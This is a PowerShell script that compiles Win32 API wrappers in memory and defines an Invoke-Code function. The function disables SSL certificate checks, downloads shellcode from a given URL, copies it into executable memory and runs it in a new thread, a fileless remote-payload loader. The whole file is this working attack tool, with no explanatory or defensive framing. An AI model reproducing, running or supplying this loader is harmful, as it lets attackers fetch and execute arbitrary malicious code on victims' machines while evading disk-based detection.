# Define the C# code for the Win32 API functions
$sourceCode = @"
using System;
using System.Runtime.InteropServices;

public class Win32 {
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr GetCurrentProcess();
}
"@

# Compile the C# code in-memory
$provider = New-Object Microsoft.CSharp.CSharpCodeProvider
$params = New-Object System.CodeDom.Compiler.CompilerParameters
$params.GenerateInMemory = $true
$params.IncludeDebugInformation = $false
$params.TreatWarningsAsErrors = $false
$params.CompilerOptions = "/optimize"
$params.ReferencedAssemblies.Add("System.dll")
$params.ReferencedAssemblies.Add("System.Runtime.InteropServices.dll")

$results = $provider.CompileAssemblyFromSource($params, $sourceCode)

if ($results.Errors.HasErrors) {
    $errors = $results.Errors | ForEach-Object { $_.ToString() }
    throw "Compilation failed: $($errors -join '; ')"
}

# Retrieve the compiled assembly
$assembly = $results.CompiledAssembly

# Define the Invoke-Code function
function Invoke-Code {
    param(
        [Parameter(Mandatory=$true)]
        [string]$Url
    )

    try {
        # Bypass SSL certificate validation if needed
        [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }

        # Download shellcode directly into memory
        $webClient = New-Object System.Net.WebClient
        $code = $webClient.DownloadData($Url)

        # Allocate executable memory
        $win32Type = $assembly.GetType("Win32")
        $virtualAlloc = $win32Type.GetMethod("VirtualAlloc")
        $memoryAddress = $virtualAlloc.Invoke($null, [IntPtr]::Zero, [uint32]$code.Length, 0x3000, 0x40)
        
        if ($memoryAddress -eq [IntPtr]::Zero) {
            throw "Failed to allocate memory"
        }

        # Copy shellcode to allocated memory
        [System.Runtime.InteropServices.Marshal]::Copy($code, 0, $memoryAddress, $code.Length)

        # Create and execute thread
        $createThread = $win32Type.GetMethod("CreateThread")
        $threadHandle = $createThread.Invoke($null, [IntPtr]::Zero, 0, $memoryAddress, [IntPtr]::Zero, 0, [IntPtr]::Zero)
        
        if ($threadHandle -eq [IntPtr]::Zero) {
            throw "Failed to create thread"
        }

        # Wait for thread to complete
        $waitForSingleObject = $win32Type.GetMethod("WaitForSingleObject")
        $waitForSingleObject.Invoke($null, $threadHandle, 0xFFFFFFFF) | Out-Null
    }
    catch {
        Write-Error "Error: $_"
    }
    finally {
        # Reset certificate validation callback
        [System.Net.ServicePointManager]::ServerCertificateValidationCallback = $null
    }
}
